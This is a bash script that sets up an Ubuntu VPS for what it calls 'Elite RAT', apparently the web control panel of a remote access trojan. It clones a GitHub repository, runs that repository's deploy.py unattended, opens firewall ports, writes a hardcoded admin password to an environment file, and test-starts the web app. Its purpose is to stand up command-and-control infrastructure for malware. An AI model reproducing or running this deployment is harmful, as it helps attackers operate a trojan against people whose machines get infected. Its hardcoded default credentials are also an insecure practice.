#!/bin/bash
# Quick VPS Setup Script for Ionos Ubuntu Server - FIXED VERSION
# Run this script on your VPS after connecting via SSH

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "This script should be run as root on your VPS"
        print_status "Run: sudo bash $0"
        exit 1
    fi
}

# Get VPS information
get_vps_info() {
    print_status "Gathering VPS information..."
    
    VPS_IP=$(curl -s ifconfig.me || hostname -I | awk '{print $1}')
    HOSTNAME=$(hostname)
    
    echo "=========================="
    echo "VPS Information:"
    echo "IP Address: $VPS_IP"
    echo "Hostname: $HOSTNAME"
    echo "OS: $(lsb_release -d | cut -f2)"
    echo "Memory: $(free -h | grep Mem | awk '{print $2}')"
    echo "Disk: $(df -h / | tail -1 | awk '{print $2}')"
    echo "=========================="
}

# Update system
update_system() {
    print_status "Updating system packages..."
    apt update -y
    apt upgrade -y
    print_success "System updated"
}

# Install essential packages
install_essentials() {
    print_status "Installing essential packages..."
    
    apt install -y \
        git \
        python3 \
        python3-pip \
        python3-venv \
        python3-dev \
        build-essential \
        curl \
        wget \
        nano \
        htop \
        unzip \
        software-properties-common
    
    print_success "Essential packages installed"
}

# Setup workspace with automatic repo clone
setup_workspace() {
    print_status "Setting up workspace..."
    
    # Remove existing workspace if it exists
    if [[ -d "/workspace" ]]; then
        rm -rf /workspace
    fi
    
    # Clone the repository
    REPO_URL="https://github.com/oranolio956/flipperflipper.git"
    print_status "Cloning repository from $REPO_URL..."
    
    git clone "$REPO_URL" /workspace
    cd /workspace
    
    print_success "Repository cloned to /workspace"
}

# Check if deployment script exists
check_deployment_files() {
    print_status "Checking for deployment files..."
    
    if [[ -f "/workspace/deploy.py" ]]; then
        print_success "Found deploy.py - automated deployment available"
        HAS_DEPLOY_SCRIPT=true
    else
        print_warning "No deploy.py found - will use manual setup"
        HAS_DEPLOY_SCRIPT=false
    fi
    
    if [[ -f "/workspace/requirements.txt" ]] || [[ -f "/workspace/requirements_production.txt" ]]; then
        print_success "Found requirements file"
    else
        print_warning "No requirements file found"
    fi
    
    if [[ -f "/workspace/web_app_real.py" ]]; then
        print_success "Found main application file"
    else
        print_warning "Main application file not found"
    fi
}

# Run automated deployment if available
run_deployment() {
    if [[ "$HAS_DEPLOY_SCRIPT" == "true" ]]; then
        print_status "Running automated deployment..."
        
        chmod +x /workspace/deploy.py
        
        # Set default environment variables for automated deployment
        export DEBIAN_FRONTEND=noninteractive
        
        python3 /workspace/deploy.py
        
        print_success "Automated deployment completed"
    else
        print_status "Running manual setup..."
        manual_setup
    fi
}

# Manual setup if no deployment script
manual_setup() {
    print_status "Setting up manually..."
    
    # Install Python requirements
    if [[ -f "/workspace/requirements_production.txt" ]]; then
        pip3 install -r /workspace/requirements_production.txt
    elif [[ -f "/workspace/requirements.txt" ]]; then
        pip3 install -r /workspace/requirements.txt
    else
        print_status "Installing common packages..."
        pip3 install flask flask-socketio flask-cors cryptography pyyaml requests psutil
    fi
    
    # Basic firewall setup
    print_status "Configuring basic firewall..."
    ufw --force enable
    ufw allow 22/tcp
    ufw allow 80/tcp
    ufw allow 443/tcp
    ufw allow 4040/tcp
    
    print_success "Manual setup completed"
}

# Configure credentials automatically
configure_credentials() {
    print_status "Setting up default credentials..."
    
    # Use default credentials for automated setup
    ADMIN_USER="admin"
    ADMIN_PASS="EliteRAT2024!"
    
    # Generate secret key
    SECRET_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))" 2>/dev/null || echo "$(openssl rand -hex 32)")
    
    # Set environment variables for immediate use
    export STITCH_ADMIN_USER="$ADMIN_USER"
    export STITCH_ADMIN_PASSWORD="$ADMIN_PASS"
    export STITCH_SECRET_KEY="$SECRET_KEY"
    
    # Create environment file if it doesn't exist
    if [[ ! -f "/etc/elite-rat/production.env" ]]; then
        mkdir -p /etc/elite-rat
        cat > /etc/elite-rat/production.env << EOF
STITCH_ADMIN_USER=$ADMIN_USER
STITCH_ADMIN_PASSWORD=$ADMIN_PASS
STITCH_SECRET_KEY=$SECRET_KEY
STITCH_HOST=0.0.0.0
STITCH_PORT=5000
STITCH_DEBUG=false
STITCH_ENABLE_HTTPS=false
STITCH_LOG_LEVEL=INFO
EOF
        chmod 640 /etc/elite-rat/production.env
    fi
    
    print_success "Default credentials configured"
    print_warning "Default admin password: $ADMIN_PASS"
    print_warning "CHANGE THIS PASSWORD AFTER DEPLOYMENT!"
}

# Test the application
test_application() {
    print_status "Testing application..."
    
    cd /workspace
    
    # Try to start the application in background for testing
    if [[ -f "web_app_real.py" ]]; then
        print_status "Starting application for testing..."
        
        # Start in background
        timeout 10s python3 web_app_real.py &
        APP_PID=$!
        
        # Wait a moment
        sleep 5
        
        # Test if it's running
        if kill -0 $APP_PID 2>/dev/null; then
            print_success "Application started successfully (PID: $APP_PID)"
            
            # Test HTTP response
            if timeout 5s curl -s http://localhost:5000 > /dev/null 2>&1; then
                print_success "Application responding on port 5000"
            else
                print_warning "Application not responding on port 5000"
            fi
            
            # Stop test instance
            kill $APP_PID 2>/dev/null || true
            wait $APP_PID 2>/dev/null || true
            
        else
            print_error "Application failed to start"
        fi
        
    elif [[ -f "start_server.py" ]]; then
        print_status "Found start_server.py, testing with that..."
        timeout 10s python3 start_server.py &
        APP_PID=$!
        sleep 5
        
        if kill -0 $APP_PID 2>/dev/null; then
            print_success "Application started successfully"
            kill $APP_PID 2>/dev/null || true
            wait $APP_PID 2>/dev/null || true
        fi
    else
        print_warning "No main application file found to test"
    fi
}

# Show final information
show_final_info() {
    echo ""
    echo "=================================="
    echo "🎉 VPS SETUP COMPLETED!"
    echo "=================================="
    echo ""
    echo "VPS Information:"
    echo "  IP Address: $VPS_IP"
    echo "  SSH Access: ssh root@$VPS_IP"
    echo ""
    echo "Application Access:"
    echo "  Web Interface: http://$VPS_IP:5000"
    echo "  HTTPS Interface: https://$VPS_IP"
    echo "  Admin Username: $ADMIN_USER"
    echo "  Admin Password: $ADMIN_PASS"
    echo ""
    echo "🚀 TO START YOUR APPLICATION:"
    echo "cd /workspace"
    echo "python3 web_app_real.py"
    echo ""
    echo "🌐 Then open in browser:"
    echo "http://$VPS_IP:5000"
    echo ""
    echo "Management Commands:"
    if [[ -f "/usr/local/bin/elite-rat-manage" ]]; then
        echo "  Service Status: elite-rat-manage status"
        echo "  Start Service: elite-rat-manage start"
        echo "  View Logs: elite-rat-manage logs"
    else
        echo "  Manual Start: cd /workspace && python3 web_app_real.py"
        echo "  Check Process: ps aux | grep python"
        echo "  View Logs: journalctl -f"
    fi
    echo ""
    echo "🔒 Security Reminders:"
    echo "- CHANGE DEFAULT PASSWORD: $ADMIN_PASS"
    echo "- Configure HTTPS for production use"
    echo "- Monitor access logs regularly"
    echo "- Keep system updated"
    echo ""
    echo "🚨 Firewall Status:"
    ufw status 2>/dev/null || echo "Firewall not configured"
    echo ""
}

# Main execution - NO USER INPUT REQUIRED
main() {
    echo "=================================="
    echo "🚀 Elite RAT VPS Quick Setup"
    echo "=================================="
    echo "This script will set up Elite RAT on your Ionos VPS"
    echo "AUTOMATED MODE - No user input required"
    echo ""
    
    check_root
    get_vps_info
    
    print_status "Starting automated setup in 3 seconds..."
    sleep 3
    
    update_system
    install_essentials
    setup_workspace
    check_deployment_files
    configure_credentials
    run_deployment
    test_application
    show_final_info
    
    print_success "Setup completed! Your Elite RAT is ready on your VPS."
    print_status "To start: cd /workspace && python3 web_app_real.py"
}

# Run main function
main "$@"